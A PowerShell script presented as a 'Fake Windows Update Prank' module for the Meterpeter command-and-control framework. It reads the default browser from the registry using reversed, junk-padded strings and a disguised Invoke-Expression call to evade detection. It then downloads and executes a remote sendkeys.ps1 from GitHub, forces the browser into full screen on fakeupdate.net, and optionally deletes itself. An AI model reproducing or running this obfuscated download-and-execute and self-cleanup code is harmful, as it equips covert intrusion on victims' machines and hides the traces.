<#
.SYNOPSIS
   Fake Windows Update Prank

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.13 that executes an prank in background.
   The prank opens the default web browser in fakeupdate.net website in full screen
   mode. To abort the prank target user requires to manual press {F11} on is keyboard.

.NOTES
   This cmdlet gets the default web browser name\path\command and operative system
   version number (to select fakeupdate.net correct wallpaper) before download and
   invoking sendkeys.ps1 cmdlet that opens fakeupdate.net website in full screen mode.
   sendkeys.ps1 cmdlet its invoked to send keyboard keys to the browser {Enter + F11}

.Parameter AutoDelete
   Auto-Delete this cmdlet in the end? (default: off)

.EXAMPLE
   PS C:\> .\FWUprank.ps1

.EXAMPLE
   PS C:\> powershell -file FWUprank.ps1

.EXAMPLE
   PS C:\> .\FWUprank.ps1 -autodelete 'on'
   Auto-Delete this cmdlet in the end

.INPUTS
   None. You cannot pipe objects into FWUprank.ps1

.OUTPUTS
   * Send Keys to running programs
     + Start and capture process info.
     + Success, sending key: 'https://fakeupdate.net/win11/~{F11}'
     + Process PID: '11864'
   * Exit sendkeys cmdlet execution ..
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$AutoDelete="off"  #autodelete cmdlet in the end
)


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
#Store operative system version
$OsVersion = [System.Environment]::OSVersion.Version.Major
If([string]::IsNullOrEmpty($OsVersion))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get operative sistem version number ...`n" -ForegroundColor DarkGray
   return
}


#Store default web browser name
$RegexDecode = (([regex]::Matches("ecioh@Cre@sU\pt@th\sno@ita@icos@sAlrU\snoita@ico@ssA\lle@hS\swod@niW\tf@os@orciM\ERA@WTF@OS\:UCK@H",'.','RightToLeft')|ForEach{$_.value}) -join '')
$DefaultSettingPath = "$RegexDecode" -replace '@',''
$DefaultBrowserName = (Get-Item -Path "$DefaultSettingPath"|Get-ItemProperty).ProgId
If([string]::IsNullOrEmpty($DefaultBrowserName))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get default web browser name ...`n" -ForegroundColor DarkGray
   return
}


#Create PSDrive to HK`EY_CL`ASSES_RO`OT
$ShellCommand = "`$n£u@l£l = N@e£w-£P@SD£ri@ve -P£SP@ro£vid@er r£eg@ist@ry -£Ro@o£t 'H£K@EY_£C@LAS£SE@S_£RO@O@T' -N@a@me 'H£K@C£R'" -replace '(@|£)',''
$ShellCommand|&('XeX' -replace '^(X)','i')

#Get the default browser executable command/path
$TestMeNpw = "£H@KC£R@:\$DefaultBrowserName\£s@hel@l\£o@pe@n\c£om@ma£n@d" -replace '(@|£)',''
$DefaultBrowserOpenCommand = (Get-Item "$TestMeNpw"|Get-ItemProperty).'(default)'
$DefaultBrowserPathSanitize = [regex]::Match($DefaultBrowserOpenCommand,'\".+?\"')
Remove-PSDrive -Name 'HKCR'

If([string]::IsNullOrEmpty($DefaultBrowserPathSanitize))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get default browser executable command/path...`n" -ForegroundColor DarkGray
   return
}

#Sanitize command
$DefaultBrowserPath = $DefaultBrowserPathSanitize.value -replace '"',''
$SendKeyscmdlet = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/sendkeys.ps1"

#Select the OS version to run
If($OsVersion -match '^(xp)$')
{
   $SystemId = "xp"
}
ElseIf($OsVersion -match '^(7)$')
{
   $SystemId = "win7"
}
ElseIf($OsVersion -match '^(10)$')
{
   $SystemId = "win10ue"
}
ElseIf($OsVersion -match '^(11)$')
{
   $SystemId = "win11"
}
Else
{
   $SystemId = "win11"
}

#Download sendkes cmdlet from github
iwr -uri "$SendKeyscmdlet" -OutFile "sendkeys.ps1"
#Execute sendkeys cmdlet to open default browser in fakeupdate.net in full windows mode
.\sendkeys.ps1 -Program "$DefaultBrowserPath" -SendKey "https://fakeupdate.net/$SystemId/~{F11}"

#CleanUp
Remove-Item -Path "sendkeys.ps1" -Force
If($AutoDelete -iMatch '^(on)$')
{
   #Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}